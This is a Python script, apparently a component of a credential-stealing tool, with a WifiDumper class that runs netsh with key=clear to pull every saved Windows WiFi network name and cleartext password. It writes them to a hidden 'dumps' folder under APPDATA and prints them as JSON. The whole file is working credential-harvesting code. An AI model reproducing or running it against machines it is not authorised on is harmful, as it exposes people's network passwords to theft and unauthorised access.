import subprocess
import re
import json
import os
from sys import platform

class WifiDumper:
    def __init__(self):
        self.profiles = []
        
    def get_wifi_profiles(self):
        """Get all saved WiFi profiles"""
        try:
            if platform != 'win32':
                return False, "WiFi password dumping is only supported on Windows"
                
            # Get all WiFi profiles
            output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
            profile_names = re.findall("All User Profile\s*: (.*)", output)
            
            for name in profile_names:
                # Clean the profile name
                name = name.strip()
                try:
                    # Get profile details including password
                    profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8', errors="backslashreplace")
                    
                    # Extract password using regex
                    password = re.search("Key Content\s*: (.*)", profile_info)
                    password = password.group(1).strip() if password else "< No Password >"
                    
                    # Extract authentication type
                    auth = re.search("Authentication\s*: (.*)", profile_info)
                    auth = auth.group(1).strip() if auth else "Unknown"
                    
                    # Extract encryption type
                    encryption = re.search("Cipher\s*: (.*)", profile_info)
                    encryption = encryption.group(1).strip() if encryption else "Unknown"
                    
                    self.profiles.append({
                        'ssid': name,
                        'password': password,
                        'authentication': auth,
                        'encryption': encryption
                    })
                    
                except subprocess.CalledProcessError:
                    # Skip profiles that can't be processed
                    continue
                    
            return True, "Successfully retrieved WiFi profiles"
            
        except subprocess.CalledProcessError:
            return False, "Failed to retrieve WiFi profiles"
        except Exception as e:
            return False, f"Error dumping WiFi passwords: {str(e)}"
            
    def save_to_file(self, filename="wifi_passwords.txt"):
        """Save the WiFi profiles to a file"""
        try:
            if not self.profiles:
                return False, "No WiFi profiles to save"
                
            # Determine save path based on platform
            if platform == 'win32':
                save_dir = os.path.join(os.environ['appdata'], 'dumps')
            else:
                save_dir = os.path.join(os.path.expanduser('~'), '.dumps')
                
            # Create dumps directory if it doesn't exist
            os.makedirs(save_dir, exist_ok=True)
            
            filepath = os.path.join(save_dir, filename)
            
            with open(filepath, 'w') as f:
                f.write("=== Saved WiFi Passwords ===\n\n")
                for profile in self.profiles:
                    f.write(f"SSID: {profile['ssid']}\n")
                    f.write(f"Password: {profile['password']}\n")
                    f.write(f"Authentication: {profile['authentication']}\n")
                    f.write(f"Encryption: {profile['encryption']}\n")
                    f.write("-" * 50 + "\n")
                    
            return True, f"WiFi passwords saved to {filepath}"
            
        except Exception as e:
            return False, f"Error saving WiFi passwords: {str(e)}"
            
    def get_json(self):
        """Return the WiFi profiles as JSON"""
        return json.dumps(self.profiles, indent=2)

if __name__ == '__main__':
    dumper = WifiDumper()
    success, message = dumper.get_wifi_profiles()
    if success:
        success, message = dumper.save_to_file()
        print(message)
        print("\nProfiles in JSON format:")
        print(dumper.get_json())
    else:
        print(f"Error: {message}") 